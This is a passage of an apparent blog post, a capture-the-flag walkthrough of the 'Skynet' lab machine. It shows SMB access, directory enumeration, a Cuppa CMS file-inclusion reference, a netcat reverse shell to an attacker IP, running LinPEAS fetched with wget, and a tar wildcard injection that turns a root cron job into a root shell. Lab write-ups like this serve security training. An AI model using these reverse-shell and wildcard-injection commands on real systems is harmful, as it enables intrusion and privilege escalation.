+  1.05 Statistics.md                  N    64291  Tue Sep 17 11:01:29 2019
+  5.02 Visualization.md               N      940  Tue Sep 17 11:01:29 2019
+  5.00 In Practice.md                 N       21  Tue Sep 17 11:01:29 2019
+  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 11:01:29 2019
+  1.10 Algorithms.md                  N    28790  Tue Sep 17 11:01:29 2019
+  3.04 Filtering.md                   N    13360  Tue Sep 17 11:01:29 2019
+  1.00 Foundations.md                 N       22  Tue Sep 17 11:01:29 2019
+
+                9204224 blocks of size 1024. 5829320 blocks available
+smb: <span class="se">\n</span>otes<span class="se">\&gt;</span> get important.txt 
+getting file <span class="se">\n</span>otes<span class="se">\i</span>mportant.txt of size 117 as important.txt <span class="o">(</span>0.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.7 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\n</span>otes<span class="se">\&gt;</span> <span class="nb">exit</span>
+</code></pre></div></div>
+<p>The answer is in the file <code class="language-plaintext highlighter-rouge">important.txt</code>:</p>
+<h2 id="question-3---what-is-the-vulnerability-called-when-you-can-include-a-remote-file-for-malicious-purposes">
+  
+  
+    <a href="#question-3---what-is-the-vulnerability-called-when-you-can-include-a-remote-file-for-malicious-purposes">#</a> Question 3 - What is the vulnerability called when you can include a remote file for malicious purposes?
+  
+  
+</h2>
+    
+<p>The index of the directory found in the previous question, is a static html page.
+<img src="/assets/images/ctf-skynet/02.png" alt="Skynet - Hydden directory" class="post-image" /></p>
+
+<p>Let’s try with <code class="language-plaintext highlighter-rouge">gobuster</code> if there are other directories:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> http://10.10.91.54/<span class="k">**********</span>/ <span class="nt">-q</span>
+/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 276]
+/administrator        <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 335] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.91.54/<span class="k">**********</span>/administrator/]
+/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 418]
+</code></pre></div></div>
+
+<p>The directory <code class="language-plaintext highlighter-rouge">/administrator</code> is interesting, let’s see what is inside:
+<img src="/assets/images/ctf-skynet/03.png" alt="Skynet - Hydden directory" class="post-image" /></p>
+
+<p>Let’s try to search some vulnerabilities for <code class="language-plaintext highlighter-rouge">Cuppa CMS</code>:
+<a href="https://www.exploit-db.com/exploits/25971" target="_blank">https://www.exploit-db.com/exploits/25971</a>
+and this is the answer.</p>
+<h2 id="question-4---what-is-the-user-flag">
+  
+  
+    <a href="#question-4---what-is-the-user-flag">#</a> Question 4 - What is the user flag?
+  
+  
+</h2>
+    
+<p>We need to upload the reverse shell so</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>akymos: 
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001   
+listening on <span class="o">[</span>any] 9001 ...
+</code></pre></div></div>
+<p>and then upload the reverse shell.</p>
+
+<p>We are in. Let’s find the user flag:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /
+<span class="nv">$ </span><span class="nb">ls
+</span>bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+<span class="nv">$ </span><span class="nb">cd </span>home
+<span class="nv">$ </span><span class="nb">ls
+</span>milesdyson
+<span class="nv">$ </span><span class="nb">cd </span>milesdyson
+<span class="nv">$ </span><span class="nb">ls
+</span>backups
+mail
+share
+user.txt
+<span class="nv">$ </span><span class="nb">cat </span>user.txt
+</code></pre></div></div>
+<h2 id="question-5---what-is-the-root-flag">
+  
+  
+    <a href="#question-5---what-is-the-root-flag">#</a> Question 5 - What is the root flag?
+  
+  
+</h2>
+    
+<p>Let’s find the root flag (after shell stabilization):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@skynet:/<span class="nv">$ </span><span class="nb">cd</span> /tmp
+www-data@skynet:/tmp<span class="nv">$ </span>wget http://10.8.32.129/linpeas.sh
+<span class="nt">--2023-05-06</span> 07:40:40--  http://10.8.32.129/linpeas.sh
+Connecting to 10.8.32.129:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 134167 <span class="o">(</span>131K<span class="o">)</span> <span class="o">[</span>text/x-sh]
+Saving to: <span class="s1">'linpeas.sh'</span>
+
+linpeas.sh          100%[<span class="o">===================&gt;]</span> 131.02K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.1s    
+
+2023-05-06 07:40:40 <span class="o">(</span>940 KB/s<span class="o">)</span> - <span class="s1">'linpeas.sh'</span> saved <span class="o">[</span>134167/134167]
+
+www-data@skynet:/tmp<span class="nv">$ </span><span class="nb">ls
+</span>linpeas.sh
+systemd-private-675464c61968479eb96c883124d90e58-dovecot.service-E5vUee
+systemd-private-675464c61968479eb96c883124d90e58-systemd-timesyncd.service-wWRYLJ
+www-data@skynet:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x linpeas.sh
+www-data@skynet:/tmp<span class="nv">$ </span>./linpeas.sh
+</code></pre></div></div>
+<p>LinPEAS found an interesting cronjob:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>/1 <span class="k">*</span>   <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    /home/milesdyson/backups/backup.sh
+</code></pre></div></div>
+<p>Let’s see what is inside:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@skynet:/tmp<span class="nv">$ </span><span class="nb">cat</span> /home/milesdyson/backups/backup.sh
+<span class="c">#!/bin/bash</span>
+<span class="nb">cd</span> /var/www/html
+<span class="nb">tar </span>cf /home/milesdyson/backups/backup.tgz <span class="k">*</span>
+www-data@skynet:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span> /home/milesdyson/backups/backup.sh
+<span class="nt">-rwxr-xr-x</span> 1 root root 74 Sep 17  2019 /home/milesdyson/backups/backup.sh
+</code></pre></div></div>
+<p>but only root can edit that file.</p>
+
+<p><em>WE ARE STUCK…</em></p>
+
+<p>After a while I found that we can use the tar wildcard to execute a reverse shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@skynet:/tmp<span class="nv">$ </span><span class="nb">cd</span> /var/www/html
+www-data@skynet:/var/www/html<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1| nc 10.8.32.129 9002 &gt;/tmp/f"</span> <span class="o">&gt;</span> shell.sh
+www-data@skynet:/var/www/html<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--checkpoint-action=exec=sh shell.sh"</span>
+www-data@skynet:/var/www/html<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="nt">--checkpoint</span><span class="o">=</span>1
+</code></pre></div></div>
+<p>Boom! We have a reverse shell:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9002
+listening on <span class="o">[</span>any] 9002 ...
+connect to <span class="o">[</span>10.8.32.129] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.91.54] 53002
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+# cd /root
+# ls
+root.txt
+# cat root.txt
+</span></code></pre></div></div>
+
+
+
+            </article>
+        </div>
+    </main>
+    
+    <script>
+        window.FontAwesomeConfig = {
+            searchPseudoElements: true
+        }
+        $(document).ready(function () {
+            $('.post-image').magnificPopup({
+                type: 'image',
+                callbacks: {
+                    elementParse: function (item) {
+                        item.src = item.el.attr('src');
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
